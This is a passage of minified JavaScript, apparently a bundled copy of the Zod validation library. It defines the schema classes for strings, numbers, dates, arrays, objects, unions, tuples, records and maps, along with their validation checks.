z=X.data.length>W.value,G=X.data.length<W.value;if(z||G){if(Y=this._getOrReturnCtx(X,Y),z)C1(Y,{code:q1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});else if(G)C1(Y,{code:q1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});Q.dirty()}}else if(W.kind==="email"){if(!AP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"email",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="emoji"){if(!jY)jY=new RegExp(NP,"u");if(!jY.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"emoji",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="uuid"){if(!FP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"uuid",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="nanoid"){if(!jP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"nanoid",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cuid"){if(!qP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"cuid",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cuid2"){if(!ZP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"cuid2",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="ulid"){if(!MP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"ulid",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="url")try{new URL(X.data)}catch{Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"url",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="regex"){if(W.regex.lastIndex=0,!W.regex.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"regex",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="trim")X.data=X.data.trim();else if(W.kind==="includes"){if(!X.data.includes(W.value,W.position))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:{includes:W.value,position:W.position},message:W.message}),Q.dirty()}else if(W.kind==="toLowerCase")X.data=X.data.toLowerCase();else if(W.kind==="toUpperCase")X.data=X.data.toUpperCase();else if(W.kind==="startsWith"){if(!X.data.startsWith(W.value))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:{startsWith:W.value},message:W.message}),Q.dirty()}else if(W.kind==="endsWith"){if(!X.data.endsWith(W.value))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:{endsWith:W.value},message:W.message}),Q.dirty()}else if(W.kind==="datetime"){if(!IU(W).test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:"datetime",message:W.message}),Q.dirty()}else if(W.kind==="date"){if(!SP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:"date",message:W.message}),Q.dirty()}else if(W.kind==="time"){if(!TP(W).test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.invalid_string,validation:"time",message:W.message}),Q.dirty()}else if(W.kind==="duration"){if(!RP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"duration",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="ip"){if(!_P(X.data,W.version))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"ip",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="jwt"){if(!EP(X.data,W.alg))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"jwt",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cidr"){if(!$P(X.data,W.version))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"cidr",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="base64"){if(!CP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"base64",code:q1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="base64url"){if(!PP.test(X.data))Y=this._getOrReturnCtx(X,Y),C1(Y,{validation:"base64url",code:q1.invalid_string,message:W.message}),Q.dirty()}else F0.assertNever(W);return{status:Q.value,value:X.data}}_regex(X,J,Q){return this.refinement((Y)=>X.test(Y),{validation:J,code:q1.invalid_string,...f1.errToObj(Q)})}_addCheck(X){return new R8({...this._def,checks:[...this._def.checks,X]})}email(X){return this._addCheck({kind:"email",...f1.errToObj(X)})}url(X){return this._addCheck({kind:"url",...f1.errToObj(X)})}emoji(X){return this._addCheck({kind:"emoji",...f1.errToObj(X)})}uuid(X){return this._addCheck({kind:"uuid",...f1.errToObj(X)})}nanoid(X){return this._addCheck({kind:"nanoid",...f1.errToObj(X)})}cuid(X){return this._addCheck({kind:"cuid",...f1.errToObj(X)})}cuid2(X){return this._addCheck({kind:"cuid2",...f1.errToObj(X)})}ulid(X){return this._addCheck({kind:"ulid",...f1.errToObj(X)})}base64(X){return this._addCheck({kind:"base64",...f1.errToObj(X)})}base64url(X){return this._addCheck({kind:"base64url",...f1.errToObj(X)})}jwt(X){return this._addCheck({kind:"jwt",...f1.errToObj(X)})}ip(X){return this._addCheck({kind:"ip",...f1.errToObj(X)})}cidr(X){return this._addCheck({kind:"cidr",...f1.errToObj(X)})}datetime(X){if(typeof X==="string")return this._addCheck({kind:"datetime",precision:null,offset:!1,local:!1,message:X});return this._addCheck({kind:"datetime",precision:typeof X?.precision==="undefined"?null:X?.precision,offset:X?.offset??!1,local:X?.local??!1,...f1.errToObj(X?.message)})}date(X){return this._addCheck({kind:"date",message:X})}time(X){if(typeof X==="string")return this._addCheck({kind:"time",precision:null,message:X});return this._addCheck({kind:"time",precision:typeof X?.precision==="undefined"?null:X?.precision,...f1.errToObj(X?.message)})}duration(X){return this._addCheck({kind:"duration",...f1.errToObj(X)})}regex(X,J){return this._addCheck({kind:"regex",regex:X,...f1.errToObj(J)})}includes(X,J){return this._addCheck({kind:"includes",value:X,position:J?.position,...f1.errToObj(J?.message)})}startsWith(X,J){return this._addCheck({kind:"startsWith",value:X,...f1.errToObj(J)})}endsWith(X,J){return this._addCheck({kind:"endsWith",value:X,...f1.errToObj(J)})}min(X,J){return this._addCheck({kind:"min",value:X,...f1.errToObj(J)})}max(X,J){return this._addCheck({kind:"max",value:X,...f1.errToObj(J)})}length(X,J){return this._addCheck({kind:"length",value:X,...f1.errToObj(J)})}nonempty(X){return this.min(1,f1.errToObj(X))}trim(){return new R8({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new R8({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new R8({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find((X)=>X.kind==="datetime")}get isDate(){return!!this._def.checks.find((X)=>X.kind==="date")}get isTime(){return!!this._def.checks.find((X)=>X.kind==="time")}get isDuration(){return!!this._def.checks.find((X)=>X.kind==="duration")}get isEmail(){return!!this._def.checks.find((X)=>X.kind==="email")}get isURL(){return!!this._def.checks.find((X)=>X.kind==="url")}get isEmoji(){return!!this._def.checks.find((X)=>X.kind==="emoji")}get isUUID(){return!!this._def.checks.find((X)=>X.kind==="uuid")}get isNANOID(){return!!this._def.checks.find((X)=>X.kind==="nanoid")}get isCUID(){return!!this._def.checks.find((X)=>X.kind==="cuid")}get isCUID2(){return!!this._def.checks.find((X)=>X.kind==="cuid2")}get isULID(){return!!this._def.checks.find((X)=>X.kind==="ulid")}get isIP(){return!!this._def.checks.find((X)=>X.kind==="ip")}get isCIDR(){return!!this._def.checks.find((X)=>X.kind==="cidr")}get isBase64(){return!!this._def.checks.find((X)=>X.kind==="base64")}get isBase64url(){return!!this._def.checks.find((X)=>X.kind==="base64url")}get minLength(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X}get maxLength(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X}}R8.create=(X)=>{return new R8({checks:[],typeName:o1.ZodString,coerce:X?.coerce??!1,...G0(X)})};function kP(X,J){let Q=(X.toString().split(".")[1]||"").length,Y=(J.toString().split(".")[1]||"").length,W=Q>Y?Q:Y,z=Number.parseInt(X.toFixed(W).replace(".","")),G=Number.parseInt(J.toFixed(W).replace(".",""));return z%G/10**W}class m6 extends B0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(X){if(this._def.coerce)X.data=Number(X.data);if(this._getType(X)!==L1.number){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_type,expected:L1.number,received:W.parsedType}),r1}let Q=void 0,Y=new B9;for(let W of this._def.checks)if(W.kind==="int"){if(!F0.isInteger(X.data))Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.invalid_type,expected:"integer",received:"float",message:W.message}),Y.dirty()}else if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.too_small,minimum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.too_big,maximum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(kP(X.data,W.value)!==0)Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else if(W.kind==="finite"){if(!Number.isFinite(X.data))Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.not_finite,message:W.message}),Y.dirty()}else F0.assertNever(W);return{status:Y.value,value:X.data}}gte(X,J){return this.setLimit("min",X,!0,f1.toString(J))}gt(X,J){return this.setLimit("min",X,!1,f1.toString(J))}lte(X,J){return this.setLimit("max",X,!0,f1.toString(J))}lt(X,J){return this.setLimit("max",X,!1,f1.toString(J))}setLimit(X,J,Q,Y){return new m6({...this._def,checks:[...this._def.checks,{kind:X,value:J,inclusive:Q,message:f1.toString(Y)}]})}_addCheck(X){return new m6({...this._def,checks:[...this._def.checks,X]})}int(X){return this._addCheck({kind:"int",message:f1.toString(X)})}positive(X){return this._addCheck({kind:"min",value:0,inclusive:!1,message:f1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:0,inclusive:!1,message:f1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:0,inclusive:!0,message:f1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:0,inclusive:!0,message:f1.toString(X)})}multipleOf(X,J){return this._addCheck({kind:"multipleOf",value:X,message:f1.toString(J)})}finite(X){return this._addCheck({kind:"finite",message:f1.toString(X)})}safe(X){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:f1.toString(X)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:f1.toString(X)})}get minValue(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X}get maxValue(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X}get isInt(){return!!this._def.checks.find((X)=>X.kind==="int"||X.kind==="multipleOf"&&F0.isInteger(X.value))}get isFinite(){let X=null,J=null;for(let Q of this._def.checks)if(Q.kind==="finite"||Q.kind==="int"||Q.kind==="multipleOf")return!0;else if(Q.kind==="min"){if(J===null||Q.value>J)J=Q.value}else if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return Number.isFinite(J)&&Number.isFinite(X)}}m6.create=(X)=>{return new m6({checks:[],typeName:o1.ZodNumber,coerce:X?.coerce||!1,...G0(X)})};class u6 extends B0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte}_parse(X){if(this._def.coerce)try{X.data=BigInt(X.data)}catch{return this._getInvalidInput(X)}if(this._getType(X)!==L1.bigint)return this._getInvalidInput(X);let Q=void 0,Y=new B9;for(let W of this._def.checks)if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.too_small,type:"bigint",minimum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.too_big,type:"bigint",maximum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(X.data%W.value!==BigInt(0))Q=this._getOrReturnCtx(X,Q),C1(Q,{code:q1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else F0.assertNever(W);return{status:Y.value,value:X.data}}_getInvalidInput(X){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:L1.bigint,received:J.parsedType}),r1}gte(X,J){return this.setLimit("min",X,!0,f1.toString(J))}gt(X,J){return this.setLimit("min",X,!1,f1.toString(J))}lte(X,J){return this.setLimit("max",X,!0,f1.toString(J))}lt(X,J){return this.setLimit("max",X,!1,f1.toString(J))}setLimit(X,J,Q,Y){return new u6({...this._def,checks:[...this._def.checks,{kind:X,value:J,inclusive:Q,message:f1.toString(Y)}]})}_addCheck(X){return new u6({...this._def,checks:[...this._def.checks,X]})}positive(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:f1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:f1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:f1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:f1.toString(X)})}multipleOf(X,J){return this._addCheck({kind:"multipleOf",value:X,message:f1.toString(J)})}get minValue(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X}get maxValue(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X}}u6.create=(X)=>{return new u6({checks:[],typeName:o1.ZodBigInt,coerce:X?.coerce??!1,...G0(X)})};class AJ extends B0{_parse(X){if(this._def.coerce)X.data=Boolean(X.data);if(this._getType(X)!==L1.boolean){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:L1.boolean,received:Q.parsedType}),r1}return O9(X.data)}}AJ.create=(X)=>{return new AJ({typeName:o1.ZodBoolean,coerce:X?.coerce||!1,...G0(X)})};class AX extends B0{_parse(X){if(this._def.coerce)X.data=new Date(X.data);if(this._getType(X)!==L1.date){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_type,expected:L1.date,received:W.parsedType}),r1}if(Number.isNaN(X.data.getTime())){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_date}),r1}let Q=new B9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.getTime()<W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_small,message:W.message,inclusive:!0,exact:!1,minimum:W.value,type:"date"}),Q.dirty()}else if(W.kind==="max"){if(X.data.getTime()>W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_big,message:W.message,inclusive:!0,exact:!1,maximum:W.value,type:"date"}),Q.dirty()}else F0.assertNever(W);return{status:Q.value,value:new Date(X.data.getTime())}}_addCheck(X){return new AX({...this._def,checks:[...this._def.checks,X]})}min(X,J){return this._addCheck({kind:"min",value:X.getTime(),message:f1.toString(J)})}max(X,J){return this._addCheck({kind:"max",value:X.getTime(),message:f1.toString(J)})}get minDate(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X!=null?new Date(X):null}get maxDate(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X!=null?new Date(X):null}}AX.create=(X)=>{return new AX({checks:[],coerce:X?.coerce||!1,typeName:o1.ZodDate,...G0(X)})};class X5 extends B0{_parse(X){if(this._getType(X)!==L1.symbol){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:L1.symbol,received:Q.parsedType}),r1}return O9(X.data)}}X5.create=(X)=>{return new X5({typeName:o1.ZodSymbol,...G0(X)})};class NJ extends B0{_parse(X){if(this._getType(X)!==L1.undefined){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:L1.undefined,received:Q.parsedType}),r1}return O9(X.data)}}NJ.create=(X)=>{return new NJ({typeName:o1.ZodUndefined,...G0(X)})};class LJ extends B0{_parse(X){if(this._getType(X)!==L1.null){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:L1.null,received:Q.parsedType}),r1}return O9(X.data)}}LJ.create=(X)=>{return new LJ({typeName:o1.ZodNull,...G0(X)})};class NX extends B0{constructor(){super(...arguments);this._any=!0}_parse(X){return O9(X.data)}}NX.create=(X)=>{return new NX({typeName:o1.ZodAny,...G0(X)})};class y6 extends B0{constructor(){super(...arguments);this._unknown=!0}_parse(X){return O9(X.data)}}y6.create=(X)=>{return new y6({typeName:o1.ZodUnknown,...G0(X)})};class p8 extends B0{_parse(X){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:L1.never,received:J.parsedType}),r1}}p8.create=(X)=>{return new p8({typeName:o1.ZodNever,...G0(X)})};class J5 extends B0{_parse(X){if(this._getType(X)!==L1.undefined){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:L1.void,received:Q.parsedType}),r1}return O9(X.data)}}J5.create=(X)=>{return new J5({typeName:o1.ZodVoid,...G0(X)})};class A8 extends B0{_parse(X){let{ctx:J,status:Q}=this._processInputParams(X),Y=this._def;if(J.parsedType!==L1.array)return C1(J,{code:q1.invalid_type,expected:L1.array,received:J.parsedType}),r1;if(Y.exactLength!==null){let z=J.data.length>Y.exactLength.value,G=J.data.length<Y.exactLength.value;if(z||G)C1(J,{code:z?q1.too_big:q1.too_small,minimum:G?Y.exactLength.value:void 0,maximum:z?Y.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:Y.exactLength.message}),Q.dirty()}if(Y.minLength!==null){if(J.data.length<Y.minLength.value)C1(J,{code:q1.too_small,minimum:Y.minLength.value,type:"array",inclusive:!0,exact:!1,message:Y.minLength.message}),Q.dirty()}if(Y.maxLength!==null){if(J.data.length>Y.maxLength.value)C1(J,{code:q1.too_big,maximum:Y.maxLength.value,type:"array",inclusive:!0,exact:!1,message:Y.maxLength.message}),Q.dirty()}if(J.common.async)return Promise.all([...J.data].map((z,G)=>{return Y.type._parseAsync(new L8(J,z,J.path,G))})).then((z)=>{return B9.mergeArray(Q,z)});let W=[...J.data].map((z,G)=>{return Y.type._parseSync(new L8(J,z,J.path,G))});return B9.mergeArray(Q,W)}get element(){return this._def.type}min(X,J){return new A8({...this._def,minLength:{value:X,message:f1.toString(J)}})}max(X,J){return new A8({...this._def,maxLength:{value:X,message:f1.toString(J)}})}length(X,J){return new A8({...this._def,exactLength:{value:X,message:f1.toString(J)}})}nonempty(X){return this.min(1,X)}}A8.create=(X,J)=>{return new A8({type:X,minLength:null,maxLength:null,exactLength:null,typeName:o1.ZodArray,...G0(J)})};function OJ(X){if(X instanceof u0){let J={};for(let Q in X.shape){let Y=X.shape[Q];J[Q]=N8.create(OJ(Y))}return new u0({...X._def,shape:()=>J})}else if(X instanceof A8)return new A8({...X._def,type:OJ(X.element)});else if(X instanceof N8)return N8.create(OJ(X.unwrap()));else if(X instanceof j6)return j6.create(OJ(X.unwrap()));else if(X instanceof d8)return d8.create(X.items.map((J)=>OJ(J)));else return X}class u0 extends B0{constructor(){super(...arguments);this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;let X=this._def.shape(),J=F0.objectKeys(X);return this._cached={shape:X,keys:J},this._cached}_parse(X){if(this._getType(X)!==L1.object){let U=this._getOrReturnCtx(X);return C1(U,{code:q1.invalid_type,expected:L1.object,received:U.parsedType}),r1}let{status:Q,ctx:Y}=this._processInputParams(X),{shape:W,keys:z}=this._getCached(),G=[];if(!(this._def.catchall instanceof p8&&this._def.unknownKeys==="strip")){for(let U in Y.data)if(!z.includes(U))G.push(U)}let H=[];for(let U of z){let K=W[U],V=Y.data[U];H.push({key:{status:"valid",value:U},value:K._parse(new L8(Y,V,Y.path,U)),alwaysSet:U in Y.data})}if(this._def.catchall instanceof p8){let U=this._def.unknownKeys;if(U==="passthrough")for(let K of G)H.push({key:{status:"valid",value:K},value:{status:"valid",value:Y.data[K]}});else if(U==="strict"){if(G.length>0)C1(Y,{code:q1.unrecognized_keys,keys:G}),Q.dirty()}else if(U==="strip");else throw new Error("Internal ZodObject error: invalid unknownKeys value.")}else{let U=this._def.catchall;for(let K of G){let V=Y.data[K];H.push({key:{status:"valid",value:K},value:U._parse(new L8(Y,V,Y.path,K)),alwaysSet:K in Y.data})}}if(Y.common.async)return Promise.resolve().then(async()=>{let U=[];for(let K of H){let V=await K.key,B=await K.value;U.push({key:V,value:B,alwaysSet:K.alwaysSet})}return U}).then((U)=>{return B9.mergeObjectSync(Q,U)});else return B9.mergeObjectSync(Q,H)}get shape(){return this._def.shape()}strict(X){return f1.errToObj,new u0({...this._def,unknownKeys:"strict",...X!==void 0?{errorMap:(J,Q)=>{let Y=this._def.errorMap?.(J,Q).message??Q.defaultError;if(J.code==="unrecognized_keys")return{message:f1.errToObj(X).message??Y};return{message:Y}}}:{}})}strip(){return new u0({...this._def,unknownKeys:"strip"})}passthrough(){return new u0({...this._def,unknownKeys:"passthrough"})}extend(X){return new u0({...this._def,shape:()=>({...this._def.shape(),...X})})}merge(X){return new u0({unknownKeys:X._def.unknownKeys,catchall:X._def.catchall,shape:()=>({...this._def.shape(),...X._def.shape()}),typeName:o1.ZodObject})}setKey(X,J){return this.augment({[X]:J})}catchall(X){return new u0({...this._def,catchall:X})}pick(X){let J={};for(let Q of F0.objectKeys(X))if(X[Q]&&this.shape[Q])J[Q]=this.shape[Q];return new u0({...this._def,shape:()=>J})}omit(X){let J={};for(let Q of F0.objectKeys(this.shape))if(!X[Q])J[Q]=this.shape[Q];return new u0({...this._def,shape:()=>J})}deepPartial(){return OJ(this)}partial(X){let J={};for(let Q of F0.objectKeys(this.shape)){let Y=this.shape[Q];if(X&&!X[Q])J[Q]=Y;else J[Q]=Y.optional()}return new u0({...this._def,shape:()=>J})}required(X){let J={};for(let Q of F0.objectKeys(this.shape))if(X&&!X[Q])J[Q]=this.shape[Q];else{let W=this.shape[Q];while(W instanceof N8)W=W._def.innerType;J[Q]=W}return new u0({...this._def,shape:()=>J})}keyof(){return CU(F0.objectKeys(this.shape))}}u0.create=(X,J)=>{return new u0({shape:()=>X,unknownKeys:"strip",catchall:p8.create(),typeName:o1.ZodObject,...G0(J)})};u0.strictCreate=(X,J)=>{return new u0({shape:()=>X,unknownKeys:"strict",catchall:p8.create(),typeName:o1.ZodObject,...G0(J)})};u0.lazycreate=(X,J)=>{return new u0({shape:X,unknownKeys:"strip",catchall:p8.create(),typeName:o1.ZodObject,...G0(J)})};class DJ extends B0{_parse(X){let{ctx:J}=this._processInputParams(X),Q=this._def.options;function Y(W){for(let G of W)if(G.result.status==="valid")return G.result;for(let G of W)if(G.result.status==="dirty")return J.common.issues.push(...G.ctx.common.issues),G.result;let z=W.map((G)=>new m9(G.ctx.common.issues));return C1(J,{code:q1.invalid_union,unionErrors:z}),r1}if(J.common.async)return Promise.all(Q.map(async(W)=>{let z={...J,common:{...J.common,issues:[]},parent:null};return{result:await W._parseAsync({data:J.data,path:J.path,parent:z}),ctx:z}})).then(Y);else{let W=void 0,z=[];for(let H of Q){let U={...J,common:{...J.common,issues:[]},parent:null},K=H._parseSync({data:J.data,path:J.path,parent:U});if(K.status==="valid")return K;else if(K.status==="dirty"&&!W)W={result:K,ctx:U};if(U.common.issues.length)z.push(U.common.issues)}if(W)return J.common.issues.push(...W.ctx.common.issues),W.result;let G=z.map((H)=>new m9(H));return C1(J,{code:q1.invalid_union,unionErrors:G}),r1}}get options(){return this._def.options}}DJ.create=(X,J)=>{return new DJ({options:X,typeName:o1.ZodUnion,...G0(J)})};var F6=(X)=>{if(X instanceof IJ)return F6(X.schema);else if(X instanceof D8)return F6(X.innerType());else if(X instanceof CJ)return[X.value];else if(X instanceof c6)return X.options;else if(X instanceof PJ)return F0.objectValues(X.enum);else if(X instanceof SJ)return F6(X._def.innerType);else if(X instanceof NJ)return[void 0];else if(X instanceof LJ)return[null];else if(X instanceof N8)return[void 0,...F6(X.unwrap())];else if(X instanceof j6)return[null,...F6(X.unwrap())];else if(X instanceof rQ)return F6(X.unwrap());else if(X instanceof _J)return F6(X.unwrap());else if(X instanceof TJ)return F6(X._def.innerType);else return[]};class iQ extends B0{_parse(X){let{ctx:J}=this._processInputParams(X);if(J.parsedType!==L1.object)return C1(J,{code:q1.invalid_type,expected:L1.object,received:J.parsedType}),r1;let Q=this.discriminator,Y=J.data[Q],W=this.optionsMap.get(Y);if(!W)return C1(J,{code:q1.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[Q]}),r1;if(J.common.async)return W._parseAsync({data:J.data,path:J.path,parent:J});else return W._parseSync({data:J.data,path:J.path,parent:J})}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(X,J,Q){let Y=new Map;for(let W of J){let z=F6(W.shape[X]);if(!z.length)throw new Error(`A discriminator value for key \`${X}\` could not be extracted from all schema options`);for(let G of z){if(Y.has(G))throw new Error(`Discriminator property ${String(X)} has duplicate value ${String(G)}`);Y.set(G,W)}}return new iQ({typeName:o1.ZodDiscriminatedUnion,discriminator:X,options:J,optionsMap:Y,...G0(Q)})}}function OY(X,J){let Q=l8(X),Y=l8(J);if(X===J)return{valid:!0,data:X};else if(Q===L1.object&&Y===L1.object){let W=F0.objectKeys(J),z=F0.objectKeys(X).filter((H)=>W.indexOf(H)!==-1),G={...X,...J};for(let H of z){let U=OY(X[H],J[H]);if(!U.valid)return{valid:!1};G[H]=U.data}return{valid:!0,data:G}}else if(Q===L1.array&&Y===L1.array){if(X.length!==J.length)return{valid:!1};let W=[];for(let z=0;z<X.length;z++){let G=X[z],H=J[z],U=OY(G,H);if(!U.valid)return{valid:!1};W.push(U.data)}return{valid:!0,data:W}}else if(Q===L1.date&&Y===L1.date&&+X===+J)return{valid:!0,data:X};else return{valid:!1}}class wJ extends B0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X),Y=(W,z)=>{if(pQ(W)||pQ(z))return r1;let G=OY(W.value,z.value);if(!G.valid)return C1(Q,{code:q1.invalid_intersection_types}),r1;if(dQ(W)||dQ(z))J.dirty();return{status:J.value,value:G.data}};if(Q.common.async)return Promise.all([this._def.left._parseAsync({data:Q.data,path:Q.path,parent:Q}),this._def.right._parseAsync({data:Q.data,path:Q.path,parent:Q})]).then(([W,z])=>Y(W,z));else return Y(this._def.left._parseSync({data:Q.data,path:Q.path,parent:Q}),this._def.right._parseSync({data:Q.data,path:Q.path,parent:Q}))}}wJ.create=(X,J,Q)=>{return new wJ({left:X,right:J,typeName:o1.ZodIntersection,...G0(Q)})};class d8 extends B0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==L1.array)return C1(Q,{code:q1.invalid_type,expected:L1.array,received:Q.parsedType}),r1;if(Q.data.length<this._def.items.length)return C1(Q,{code:q1.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),r1;if(!this._def.rest&&Q.data.length>this._def.items.length)C1(Q,{code:q1.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),J.dirty();let W=[...Q.data].map((z,G)=>{let H=this._def.items[G]||this._def.rest;if(!H)return null;return H._parse(new L8(Q,z,Q.path,G))}).filter((z)=>!!z);if(Q.common.async)return Promise.all(W).then((z)=>{return B9.mergeArray(J,z)});else return B9.mergeArray(J,W)}get items(){return this._def.items}rest(X){return new d8({...this._def,rest:X})}}d8.create=(X,J)=>{if(!Array.isArray(X))throw new Error("You must pass an array of schemas to z.tuple([ ... ])");return new d8({items:X,typeName:o1.ZodTuple,rest:null,...G0(J)})};class Q5 extends B0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==L1.object)return C1(Q,{code:q1.invalid_type,expected:L1.object,received:Q.parsedType}),r1;let Y=[],W=this._def.keyType,z=this._def.valueType;for(let G in Q.data)Y.push({key:W._parse(new L8(Q,G,Q.path,G)),value:z._parse(new L8(Q,Q.data[G],Q.path,G)),alwaysSet:G in Q.data});if(Q.common.async)return B9.mergeObjectAsync(J,Y);else return B9.mergeObjectSync(J,Y)}get element(){return this._def.valueType}static create(X,J,Q){if(J instanceof B0)return new Q5({keyType:X,valueType:J,typeName:o1.ZodRecord,...G0(Q)});return new Q5({keyType:R8.create(),valueType:X,typeName:o1.ZodRecord,...G0(J)})}}class Y5 extends B0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==L1.map)return C1(Q,{code:q1.invalid_type,expected:L1.map,received:Q.parsedType}),r1;let Y=this._def.keyType,W=this._def.valueType,z=[...Q.data.entries()].map(([G,H],U)=>{return{key:Y._parse(new L8(Q,G,Q.path,[U,"key"])),value:W._parse(new L8(Q,H,Q.path,[U,"value"]))}});if(Q.common.async){let G=new Map;return Promise.resolve().then(async()=>{for(let H of z){let U=await H.key,K=await 